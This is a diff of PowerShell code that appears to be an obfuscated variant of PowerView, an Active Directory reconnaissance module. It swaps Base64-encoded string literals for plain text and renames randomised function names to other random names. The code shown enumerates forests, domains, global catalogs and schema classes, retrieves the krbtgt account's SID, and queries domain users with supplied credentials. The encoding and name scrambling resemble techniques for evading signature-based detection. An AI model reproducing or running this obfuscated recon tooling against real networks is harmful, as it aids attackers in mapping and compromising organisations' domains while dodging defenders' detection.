-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIEV4dHJhY3RlZCBkb21haW4gJyRGb3Jlc3QnIGZyb20gLUNyZWRlbnRpYWw=")))
+                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
             }
 
-            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0"))), $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)
 
             try {
                 $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckVGFyZ2V0Rm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFsaWQ6IHswfQ=="))) -f $_)
+                Write-Verbose ("[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: {0}" -f $_)
                 $Null
             }
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) {
-            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0"))), $Forest)
+        elseif ($PSBoundParameters['Forest']) {
+            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
             try {
                 $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Gb3Jlc3RdIFRoZSBzcGVjaWZpZWQgZm9yZXN0ICckRm9yZXN0JyBkb2VzIG5vdCBleGlzdCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgb3IgdGhlcmUgaXNuJ3QgYW4gZXhpc3RpbmcgdHJ1c3Q6IHswfQ=="))) -f $_)
+                Write-Verbose ("[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: {0}" -f $_)
                 return $Null
             }
         }
@@ -2654,23 +2658,23 @@ function ongcjs {
 
         if ($ForestObject) {
             
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                $ForestSid = (cqaorm -Identity ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0"))) -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
+            if ($PSBoundParameters['Credential']) {
+                $ForestSid = (ykrker -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
             }
             else {
-                $ForestSid = (cqaorm -Identity ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("a3JidGd0"))) -Domain $ForestObject.RootDomain.Name).objectsid
+                $ForestSid = (ykrker -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
             }
 
-            $Parts = $ForestSid -Split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
-            $ForestSid = $Parts[0..$($Parts.length-2)] -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))
-            $ForestObject | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Um9vdERvbWFpblNpZA=="))) $ForestSid
+            $Parts = $ForestSid -Split '-'
+            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
+            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
             $ForestObject
         }
     }
 }
 
 
-function jcmjle {
+function zrzgmi {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2689,10 +2693,10 @@ function jcmjle {
 
     PROCESS {
         $Arguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
 
-        $ForestObject = ongcjs @Arguments
+        $ForestObject = cgxtvt @Arguments
         if ($ForestObject) {
             $ForestObject.Domains
         }
@@ -2700,7 +2704,7 @@ function jcmjle {
 }
 
 
-function ddlkja {
+function cgkvcr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2719,10 +2723,10 @@ function ddlkja {
 
     PROCESS {
         $Arguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
 
-        $ForestObject = ongcjs @Arguments
+        $ForestObject = cgxtvt @Arguments
 
         if ($ForestObject) {
             $ForestObject.FindAllGlobalCatalogs()
@@ -2731,7 +2735,7 @@ function ddlkja {
 }
 
 
-function vkngra {
+function gzoaks {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2756,13 +2760,13 @@ function vkngra {
 
     PROCESS {
         $Arguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $Forest }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $Arguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
 
-        $ForestObject = ongcjs @Arguments
+        $ForestObject = cgxtvt @Arguments
 
         if ($ForestObject) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3NOYW1l")))]) {
+            if ($PSBoundParameters['ClassName']) {
                 ForEach ($TargetClass in $ClassName) {
                     $ForestObject.Schema.FindClass($TargetClass)
                 }
@@ -2775,7 +2779,7 @@ function vkngra {
 }
 
 
-function duylon {
+function bmnvlg {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -2817,7 +2821,7 @@ function duylon {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -2843,70 +2847,70 @@ function duylon {
         $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
 
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                $TargetForest = wjdyuo -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
+        if ($PSBoundParameters['Domain']) {
+            if ($PSBoundParameters['Credential']) {
+                $TargetForest = owdzhi -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
             }
             else {
-                $TargetForest = wjdyuo -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
+                $TargetForest = owdzhi -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
             }
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFbnVtZXJhdGVkIGZvcmVzdCAnJFRhcmdldEZvcmVzdCcgZm9yIHRhcmdldCBkb21haW4gJyREb21haW4=")))
+            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
         }
 
         $SchemaArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SchemaArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
         if ($TargetForest) {
-            $SchemaArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rm9yZXN0")))] = $TargetForest
+            $SchemaArguments['Forest'] = $TargetForest
         }
     }
 
     PROCESS {
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVmZXJlbmNlUHJvcGVydHlTZXQ=")))]) {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBVc2luZyBzcGVjaWZpZWQgLVJlZmVyZW5jZVByb3BlcnR5U2V0")))
+        if ($PSBoundParameters['ReferencePropertySet']) {
+            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
             $ReferenceObjectProperties = $ReferencePropertySet
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVmZXJlbmNlT2JqZWN0")))]) {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFeHRyYWN0aW5nIHByb3BlcnR5IG5hbWVzIGZyb20gLVJlZmVyZW5jZU9iamVjdCB0byB1c2UgYXMgdGhlIHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQ=")))
+        elseif ($PSBoundParameters['ReferenceObject']) {
+            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
             $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
             $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBDYWxjdWxhdGVkIFJlZmVyZW5jZU9iamVjdENsYXNzIDogJFJlZmVyZW5jZU9iamVjdENsYXNz")))
+            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBVc2luZyB0aGUgZGVmYXVsdCByZWZlcmVuY2UgcHJvcGVydHkgc2V0IGZvciB0aGUgb2JqZWN0IGNsYXNzICckQ2xhc3NOYW1l")))
+            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
         }
 
-        if (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg==")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcg=="))))) {
-            $Objects = cqaorm @SearcherArguments
+        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
+            $Objects = ykrker @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $UserReferencePropertySet
             }
         }
-        elseif (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA=")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXA="))))) {
-            $Objects = pvupkd @SearcherArguments
+        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
+            $Objects = xcrlsg @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $GroupReferencePropertySet
             }
         }
-        elseif (($ClassName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXI=")))) -or ($ReferenceObjectClass -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXI="))))) {
-            $Objects = aglnim @SearcherArguments
+        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
+            $Objects = auxvef @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $ComputerReferencePropertySet
             }
         }
         else {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBJbnZhbGlkIGNsYXNzOiAkQ2xhc3NOYW1l")))
+            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
         }
 
         ForEach ($Object in $Objects) {
@@ -2914,10 +2918,10 @@ function duylon {
             ForEach($ObjectProperty in $ObjectProperties) {
                 if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                     $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FtQWNjb3VudE5hbWU="))) $Object.SamAccountName
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydHk="))) $ObjectProperty
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VmFsdWU="))) $Object.$ObjectProperty
-                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlByb3BlcnR5T3V0bGllcg=="))))
+                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
+                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
+                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
+                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                     $Out
                 }
             }
@@ -2932,7 +2936,7 @@ function duylon {
 
 
 
-function cqaorm {
+function ykrker {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -2992,7 +2996,7 @@ function cqaorm {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -3024,142 +3028,142 @@ function cqaorm {
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
         
-        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; ("NOT_{0}" -f $_)}
         
-        dnsdja -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        inpqyn -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $UserSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $UserSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
         
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            dnsdja -CreateVariables -BoundParameters $PSBoundParameters
+            inpqyn -CreateVariables -BoundParameters $PSBoundParameters
         }
 
         if ($UserSearcher) {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                elseif ($IdentityInstance -match '^CN=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $UserSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $UserSearcher = vydvzz @SearcherArguments
                         if (-not $UserSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWlu")))
+                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
